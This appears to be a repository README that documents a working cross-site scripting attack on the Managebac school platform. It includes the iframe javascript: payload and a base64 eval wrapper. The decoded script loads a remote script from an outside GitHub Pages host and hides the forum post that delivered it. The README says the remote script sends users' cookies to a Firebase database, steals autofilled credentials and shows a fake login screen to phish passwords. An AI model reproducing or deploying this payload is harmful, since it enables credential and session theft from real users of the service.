# Managebac XSS attack
Managebac is a very secure systen, however it has a vulnerability allowing XSS attacks using iframe src, ```<iframe src="javascript:{codehere}"><iframe>```, this enables an attacker to execute code in discussion forums or similiar to steal user credentials

# Payload used
The payload I used for this repo is:
```
<iframe id="discussion-payload-iframe" src="javascript:eval(atob(`{base64encodedhere}`));"></iframe> 
```
with the executed payload (which is in base64 for various reasons) being 
```
top.document.getElementById("discussion-payload-iframe").parentNode.parentNode.parentNode.parentNode.remove(); let a = document.createElement('script'); a.type = "module"; a.src = 'https://existencing.github.io/xss/mb.js'; top.document.head.appendChild(a);
```
which in base 64 is
```
bGV0IGEgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTsgYS50eXBlID0gIm1vZHVsZSI7IGEuc3JjID0gJ2h0dHBzOi8vZXhpc3RlbmNpbmcuZ2l0aHViLmlvL3hzcy9tYi5qcyc7IHRvcC5kb2N1bWVudC5oZWFkLmFwcGVuZENoaWxkKGEpOyB0b3AuZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImRpc2N1c3Npb24tcGF5bG9hZC1pZnJhbWUiKS5wYXJlbnROb2RlLnBhcmVudE5vZGUucGFyZW50Tm9kZS5wYXJlbnROb2RlLnJlbW92ZSgpOyA=
```
# Functioning of code
1. Using XSS payload, inject a script into top frame of document (i.e target website)
2. Script grabs cookies of website and sends them to a Firebase DB
3. Script creates another frame which imitates login screen, if autofill credentials is enabled, then credentials are stolen and script self deletes
4. If credentials not stolen already, then a fake login screen is injected that tricks user to enter credentials, script self deletes